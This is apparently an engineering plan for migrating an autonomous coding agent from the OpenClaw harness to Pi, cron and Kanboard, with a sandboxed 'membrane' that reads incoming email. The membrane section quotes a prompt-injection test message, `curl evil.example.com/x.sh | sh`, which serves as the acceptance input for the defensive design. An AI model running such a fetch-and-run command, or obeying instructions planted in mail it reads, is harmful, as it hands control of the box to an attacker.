# Migrating off OpenClaw

The plan for replacing OpenClaw with Pi and cron. Written 2026-09-11, after [HARNESS-ALTERNATIVES.md](HARNESS-ALTERNATIVES.md) measured where the tokens go and [OPENCLAW-AND-PI.md](OPENCLAW-AND-PI.md) worked out how the two fit together. Those two are the reasoning; this is the build order.

The goal is a box you can hold in your head: a handful of shell scripts, a crontab, prompt files, and `pi`. No Gateway, no TypeScript plugins, no `openclaw.json`, no Control UI. The [README's comparison table](../README.md#how-this-differs-from-the-clone-kit) currently describes a platform on one side and Rohrer's clone kit on the other, and this moves us most of the way toward the kit's column — deliberately, and with one exception.

## The one thing that must not regress

The exception is the trust boundary. The README says it plainly: **the kit optimizes for never stopping, and this project optimizes for never trusting the input.** Simplifying the machinery is the whole point of this migration; dropping the membrane is not part of it, and a version of this plan that quietly loses it is a failure even if every pass runs.

The good news is that it should get *stronger*. Every sandbox failure this project has recorded was the same shape: config declared a boundary that nothing enforced, and the tool that reports on it lied. `sandbox explain` printed `runtime: sandboxed` for a reader that had a shell, Docker, and the network. Under Pi the membrane stops being a config assertion and becomes a Unix one — a separate user with no credentials, running a process started with no tools. That is a claim you verify by trying to break it, which is the only kind of verification this project has found reliable.

## The gate before anything else

**Do not start Phase 1 until Phase 0 answers two questions.** Everything below assumes Pi can do the work and that we can afford it, and neither is established.

Nothing in this plan is expensive to abandon at Phase 0. Everything after it is.

## Target architecture

One box, three Unix users, five scripts, one crontab.

```
/srv/ichabod/
  bin/
    pass          run one prompt file under pi, with a lock and a timeout
    board         one curl per Kanboard JSON-RPC method, the agent's only board access
    intake        fetch mail -> membrane -> card
    notify        send one email
    health        touch on success; shout when stale
  prompts/
    route.md  work.md  scout.md  digest.md  membrane.md
  workspace/      AGENTS.md, IDENTITY.md, SOUL.md, USER.md, MEMORY.md, memory/, skills/
  log/            YYYY-MM-DD/HHMM-<pass>.jsonl, one per run
  env             0600, the API keys, sourced by the wrappers
```

| User | Runs | Has |
|---|---|---|
| `ichabod` | every pass, every worker, and the membrane wrapper | Docker, `gh`, the API keys, the mailbox, sudo where it already has it |
| `openclaw` | nothing, once this is done | deleted at the end |

The membrane runs as `ichabod` rather than as a user of its own — see [The membrane, rebuilt](#the-membrane-rebuilt) for what that costs and how the isolation is kept anyway.

The crontab, as a starting shape:

```cron
*/5  * * * *  /srv/ichabod/bin/intake
*/15 * * * *  /srv/ichabod/bin/pass route
*/15 * * * *  /srv/ichabod/bin/pass work
0 4,11,18 * * *  /srv/ichabod/bin/pass scout
0 7  * * *    /srv/ichabod/bin/pass digest
```

`pass` is the whole harness. Roughly:

```bash
#!/usr/bin/env bash
set -euo pipefail
name="$1"
set -a; . /srv/ichabod/env; set +a
exec flock -n "/run/ichabod/$name.lock" \
  timeout 1800 \
  pi -p --mode json --tools read,write,edit,bash --no-session \
     -C /srv/ichabod/workspace \
     @"/srv/ichabod/prompts/$name.md" \
  > "/srv/ichabod/log/$(date +%F)/$(date +%H%M)-$name.jsonl"
```

`flock -n` is the concurrency rule that `--max-starts 1` enforces today: if the previous run is still going, this one exits rather than stacking. `timeout` is the stall recovery that "a `running` card that has not moved in over an hour is stuck" currently handles by hand.

**Keep `route` and `work` separate at first, even though collapsing them is tempting.** `route.md` is `director.md` with the workboard commands swapped out, and that prompt is battle-tested — eight numbered steps refined against real failures. `work.md` is new. Merging them into one "read the board, do the next thing" loop is the genuinely Sammy-shaped end state and is probably right eventually, but it changes two things at once. Do it as a later simplification, once the substrate is proven, and do it because the separation turned out not to earn its keep rather than on principle.

## What replaces what

| OpenClaw provides | Replacement | Confidence |
|---|---|---|
| Scheduler (`automations`) | cron + `flock` + `timeout` | High. This is cron's actual job |
| Agent loop, context assembly | `pi -p` | High, pending Phase 0 |
| Workboard | Kanboard, reached by a `board` shell wrapper over JSON-RPC | High. The API is plain HTTP |
| `triage-guard` hook | The membrane's wrapper — it parses Pi's output and writes the card itself | High. Stronger than a hook |
| Sandbox for `mail_reader` | Pi started with no tools, under `env -i` | High, and testable |
| IMAP intake plugin | ~40 lines of Python `imaplib` in `intake` | High. It already does DMARC checks we can keep |
| `smtp-send` plugin | ~20 lines of Python `smtplib` in `notify` | High |
| `mailbox` plugin (search/archive) | The same script, more subcommands | High |
| SecretRefs + secret store | `/srv/ichabod/env`, mode 0600 | High, and honest — see below |
| Session ledger, token accounting | Pi's `--mode json` events, one file per run in `log/` | High. Better for forensics than today |
| `backup create --verify` | `git commit` of `workspace/` to a private repo, every pass | High. Off-box and diffable |
| Model fallback chain | Nothing. A provider outage fails the pass; cron retries | Accepted loss |
| Control UI | Kanboard's own UI for the board; `tail` and `jq` for everything else | Partial loss |
| Multi-agent routing, `templates/new-agent` | A prompt file and a cron line | Simplification, not a loss |

**On secrets, say the true thing.** The guide already concedes OpenClaw's store "is not an HSM: values are stored in its local SQLite state and protected by filesystem permissions." A 0600 file protected by filesystem permissions is the same security property with less machinery. What we actually lose is redaction — OpenClaw kept values out of model context by construction, and a shell-sourced env var is one `env` call away from a transcript. The mitigation is that `ichabod` is root-equivalent anyway and always was; the membrane, which is the user we do not trust, gets no keys at all.

## The board

**Kanboard, reached by a `board` shell wrapper over its JSON-RPC API. Not over MCP.**

That second sentence is the whole design decision, and it is worth being blunt about why. MCP tool schemas are the tax this migration exists to remove — the 20-tool director preamble measured at 38,831 tokens carries 67,183 characters of tool schemas, most of it OpenClaw's 14 bridged MCP tools, re-sent on every single turn. Bolting a Kanboard MCP server onto Pi recreates that in miniature, permanently, for a board we could reach with `curl`. Pi does not ship MCP support at all; it arrives through a third-party adapter, and the most-recommended one advertises itself as "token-efficient," which tells you what the naive version costs.

Kanboard's API does not need any of that. It is JSON-RPC over HTTP with basic auth — username `jsonrpc`, password the API token — so the whole integration is one script:

```bash
#!/usr/bin/env bash
# board <method> [json-params]   e.g. board getAllTasks '{"project_id":1,"status_id":1}'
set -euo pipefail
curl -sS -u "jsonrpc:$KANBOARD_TOKEN" "$KANBOARD_URL/jsonrpc.php" \
  -d "$(jq -cn --arg m "$1" --argjson p "${2:-{\}}" \
        '{jsonrpc:"2.0",id:1,method:$m,params:$p}')" | jq '.result'
```

**That costs zero preamble tokens.** `bash` is already one of Pi's four tools; the wrapper needs no schema, only three lines of usage in `route.md`. Compare that to a schema per board method on every request. It is also strictly more debuggable — you can run `board getAllTasks '{"project_id":1}'` yourself in a shell and see exactly what the agent sees, which is the verification style this project has learned to trust.

### Where Kanboard runs

The box has no inbound SSH and reaches the world outbound only, and the loop needs the board every fifteen minutes. Hosting Kanboard at home means putting a tunnel in the path of the operating loop.

**Recommendation: run it on the ichabod box, in Docker, behind Traefik at `board.ichabod-crane.net`.** That is the pattern the box already runs for everything it deploys, the wildcard cert already exists, and `AGENTS.md` already grants authority over that hostname. The agent reaches it over loopback; Zach reaches it over the web from anywhere, including his own network. No tunnel, no new inbound path, nothing in the loop that can be unreachable.

Two consequences to handle deliberately:

- **Ichabod can destroy his own board.** `AGENTS.md` grants full Docker authority including `system prune` and volumes, and warns in the same breath that destroying a named volume usually destroys the only copy of an application's data. The Kanboard volume needs a named exception in that file, in the same voice as the other ceilings.
- **The board dies with the box.** A `tofu` rebuild is a new EBS volume. The fix is a plain-text mirror rather than a backup product: a nightly `board getAllTasks` dump committed into the workspace repo. Diffable, off-box, and restorable into a fresh Kanboard or read by a human with no Kanboard at all.

Running it at home instead is a reasonable second answer if the board surviving the box matters more than keeping the network out of the loop, and it means joining the EC2 box to a tailnet. Worth noting that `SETUP-CHECKLIST.md` says "no Tailscale Serve or Funnel" — that rule is about exposing the Gateway to the internet, not about tailnet membership, so it does not forbid this. It is still a dependency the loop does not currently have.

### On GitHub Projects, since you asked

Yes, and they are properly scriptable. `gh project` went GA and covers `item-add`, `item-list`, `field-list`, and `item-edit`, and you can set a status by name rather than by node id:

```bash
gh project item-edit 1 --owner ich4bod \
  --url https://github.com/ich4bod/work/issues/23 \
  --field "Status" --value "In Progress"
```

So it is a real fallback if Kanboard turns out to be a nuisance. The caveats: Projects v2 is user- or org-scoped rather than repo-scoped, the token needs the `project` scope and fine-grained token support there has historically been patchy, and the by-name convenience sits on a GraphQL API that gets fiddly the moment you need anything custom. Plain Issues plus labels gets you most of a kanban with a fraction of the moving parts, and `gh issue list --json` is smaller than anything Projects returns.

Ranking for the record, matching Zach's stated order: Kanboard first, GitHub Projects or Issues second, SQLite third, markdown files last. The `board` wrapper is the seam that makes this cheap to change — every prompt calls `board <verb>`, so swapping the substrate is a rewrite of one script, not of five prompts.

## The membrane, rebuilt

The risky piece, so it is specified rather than sketched. Zach's call is the simplified version: **no separate Unix user — one user, and a reader started with no tools.** That is a deliberate trade and this section says what it costs and how to buy most of it back for free.

`intake` runs as `ichabod` and does four things in order:

1. **Fetch.** `imaplib`, one unread message, DMARC and allowed-sender checks kept exactly as `configure-imap` has them today. An empty `allowedSenders` must still disable the account rather than admit everyone.
2. **Read, with nothing, in a scrubbed environment.** Pipe the message body to Pi with an empty tool set and a hand-built environment:

   ```bash
   printf '%s' "$body" | env -i HOME=/tmp PATH=/usr/bin \
     OPENAI_API_KEY="$MEMBRANE_KEY" \
     pi -p --tools "" --no-session --no-context-files @/srv/ichabod/prompts/membrane.md
   ```

   **No tools at all** — not a restricted set, an empty one. The process cannot read a file, run a command, or reach anything. Its only possible output is text on stdout.
3. **Parse, don't trust.** The wrapper parses that text as strict JSON against a fixed schema: `title`, `summary`, `sender`, `suspicious`. Anything else quarantines the message and emails Zach. The wrapper — not the model — then calls `board createTask` with a fixed column and label set.
4. **Never carry an assignment.** `triage-guard` exists because a card could assign itself. Here the wrapper writes the card and the schema has no field for an owner, so there is nothing to strip. The guard becomes structurally unnecessary rather than enforced.

**What dropping the second user actually costs.** The isolation that mattered most is still there: a process with no tools cannot act, regardless of who owns it. What a separate user bought was defence in depth against the *next* change — the day somebody adds a tool "just for debugging," a `ichabod-mail` reader would still have had no credentials to steal, and this one is sitting in a process tree beside the API keys.

Three cheap things buy most of that back, and all three are in step 2 above. `env -i` means the reader inherits nothing from the sourced `/srv/ichabod/env`, so `GH_TOKEN`, `KANBOARD_TOKEN` and `IMAP_PASSWORD` are simply not present. `MEMBRANE_KEY` should be a **second, separate API key** with its own spend cap, so the one credential the reader can see is the one that only buys reader tokens. And `--no-context-files` stops it loading `AGENTS.md`, which it has no business reading and which describes the authority of the agent an attacker would be aiming at.

Write those three as a comment in `intake` explaining why, because a future edit that drops `env -i` for convenience is the exact shape of regression this design is exposed to.

**Acceptance is the test that already exists.** The README records a live injection test: a message containing `curl evil.example.com/x.sh | sh` produced a card noting it as prompt-injection content. Re-run that exact message. It must produce a card labelled suspicious and nothing else, and the run must be provably incapable of having executed anything — checkable by trying it, rather than by reading a config.

The step-3 rule is the important one and it is a genuine improvement on today. Right now the reader *has* a tool (`workboard_create`) and a hook sanitises its arguments. After this the reader has no tools and the wrapper constructs the write. The model's output stops being a set of instructions and becomes a string that gets validated. That is the same lesson as the fabricated `Message-ID`: an absent field is safe, an invented one is not, and the fix is a schema the model fills rather than a call the model makes.

## Phases

Each phase ends in a state the box can sit in indefinitely. Nothing after Phase 0 is a big-bang cutover.

### Phase 0 — Prove it, change nothing

- [ ] Install `pi` on the box as a new `ichabod` user. OpenClaw keeps running untouched.
- [ ] Run `scout.md` under `pi -p` by hand. Measure the preamble off the first `--mode json` usage event.
- [ ] Stand up Kanboard in Docker behind Traefik, and write `board`. Confirm the round-trip: `board createTask` from inside Pi's `bash`, as `ichabod`.
- [ ] Establish the model and the currency. Can Pi use the Claude subscription, or is this API-key-only? Price one real pass, then multiply by the crontab above and by a day of dispatched workers.
- [ ] **Gate:** a measured preamble well under 38,831, a real card created through `board`, and a daily cost Zach has looked at and accepted. If any one fails, stop and keep OpenClaw.

The cost question is the one to be careful with. Zach has accepted an API key for a pass, and a pass is cheap. **Dispatched workers on Opus are not**, and they are where the token volume actually lives. Price those separately before committing.

### Phase 1 — Skeleton, nothing scheduled

- [ ] `runtime/` in this repo: `bin/`, `prompts/`, a crontab template, a deploy script.
- [ ] Deploy it alongside OpenClaw. Both stacks on the box, only one of them scheduled.
- [ ] `notify` first, since the digest needs it, and it is the smallest end-to-end proof that the new stack can reach the outside world.
- [ ] **Acceptance:** an email from `notify`, sent by cron, arriving with the right envelope sender.

### Phase 2 — Move the read-only passes

Scout and digest. They read and report; if they break, nothing is lost and you find out in a day.

- [ ] Port `scout.md` and `digest.md` to the new prompts directory.
- [ ] Remove the OpenClaw jobs for both, add the cron lines.
- [ ] Run for three days next to an untouched director.
- [ ] **Acceptance:** three digests, three days of scout sweeps, no silent skips. Compare per-pass cost against Phase 0's estimate.

### Phase 3 — The board

The biggest single piece, and the point of no easy return.

- [ ] Kanboard is already up from Phase 0. Define the swimlanes and columns to match today's statuses: triage, backlog, ready, running, review, blocked, done.
- [ ] Name the Kanboard volume in `AGENTS.md` as a thing Ichabod does not remove, alongside the existing capacity ceilings.
- [ ] Add the nightly `board getAllTasks` dump, committed into the workspace repo.
- [ ] Migrate live cards. Everything not `done` becomes a Kanboard task; `done` cards export to one file and are dropped.
- [ ] Rewrite `director.md` into `route.md` against `board`. Steps 2, 4, 5 and 6 get shorter; step 1's projection one-liner and step 7's twin-retirement both disappear, since Kanboard returns small results and tasks can be edited in place.
- [ ] Move the journal onto the card. Kanboard tasks take comments, so most of `memory/YYYY-MM-DD/` stops existing and the passes stop reading it.
- [ ] Write `work.md` — take the top `ready` task, do it, comment what happened, move the column.
- [ ] **Acceptance:** a week of routing and one real card taken from `triage` to `done` entirely on the new stack, with the reasoning readable on the card rather than in the journal.

### Phase 4 — The membrane

- [ ] Provision `MEMBRANE_KEY` as a second API key with its own spend cap.
- [ ] Build `intake` and `membrane.md` to the four-step spec above, with `env -i`, `--tools ""` and `--no-context-files`, and the comment explaining all three.
- [ ] **Acceptance:** the README's injection message produces a suspicious-labelled card and nothing else; a normal message produces a clean one; a malformed model response quarantines rather than guesses; and `env` inside the reader shows no `GH_TOKEN`, `KANBOARD_TOKEN` or `IMAP_PASSWORD`. Turn off OpenClaw's IMAP account only after all four pass.

### Phase 5 — Delete OpenClaw

One commit, at the end, so the branch is additive until it isn't.

- [ ] Stop and disable the Gateway. Uninstall.
- [ ] Delete `plugins/`, `scripts/configure-*`, `scripts/install-plugin`, `scripts/build-sandbox-image`, the `sync`/`imap`/`plugins`/`ui`/`openclaw` Makefile targets.
- [ ] Rewrite `README.md` and `docs/ICHABOD-GUIDE.md`. Most of the guide's hard-won OpenClaw lessons stop applying and should be cut, not archived in place — `git log` is the archive.
- [ ] Rewrite `workspace/AGENTS.md`: no Workboard cards, no Gateway restarts, no `openclaw` authority language.
- [ ] Delete the `openclaw` user, and the `triage-guard` plugin with it — it has no job left.

### Phase 6 — Reap

- [ ] Re-check the instance type. `t3a.large` was sized for a Node Gateway, a sandbox image, and Docker. Two of those are gone.
- [ ] Fold `route` and `work` into one loop if the separation has not earned itself.

## Branch discipline

- `zf/pi-migration` off `main`, long-lived, merged once at the end.
- **Additive until Phase 5.** Nothing is deleted while the old stack is still the one serving. That keeps the diff reviewable and every phase revertible with one deploy.
- Land the two memos on `main` first, in their own small PR, so this branch is only the build.
- Both stacks coexist on the box the whole time, under different Unix users. Cutover is per pass, by moving one cron line, never by flipping the machine.
- Each phase is its own commit with its acceptance evidence in the message.

## What we lose, stated plainly

- OpenClaw's Control UI. Kanboard replaces the part of it that showed the board, and nothing replaces the part that showed sessions, tool calls and agent state — that becomes `jq` over `log/`.
- Model fallback. A provider outage becomes a failed pass rather than a slower one.
- Typed plugin surfaces. Everything becomes shell and Python, which is easier to read and easier to get subtly wrong.
- The multi-agent story. `templates/new-agent` and "agents Ichabod creates himself" become "another prompt file and another cron line" — smaller, and less interesting.
- OpenClaw's own operational knowledge, most of `docs/ICHABOD-GUIDE.md`, several weeks of it hard-won.

## What gets simpler

- One preamble we control completely, instead of a third of it arriving from a server overnight.
- Synchronous `bash`, which is the contract every prompt on this box is already written against.
- Every failure reproducible from a shell. No `config validate` that passes on broken states, no `sandbox explain` that reports a boundary that isn't there.
- The trust boundary enforced by the kernel rather than by a config file, and testable by attacking it.
- Everything in git, including memory, including the journal.
- Nothing to keep alive. There is no daemon whose death is a silent outage.

## Open questions

- Can Pi use the Claude subscription, or is this API-key-only? Phase 0, and it sets the budget.
- What do dispatched workers cost on an API key? The passes are cheap and the workers are not, and only the workers are unbounded.
- Does Kanboard-on-the-box hold up, or does the board want to live somewhere a `tofu` rebuild cannot take with it?
- Is one Kanboard project with columns enough, or does the router want swimlanes per kind of work?
- Does `route`/`work` need to stay split? Answerable only after Phase 3 has run for a while.
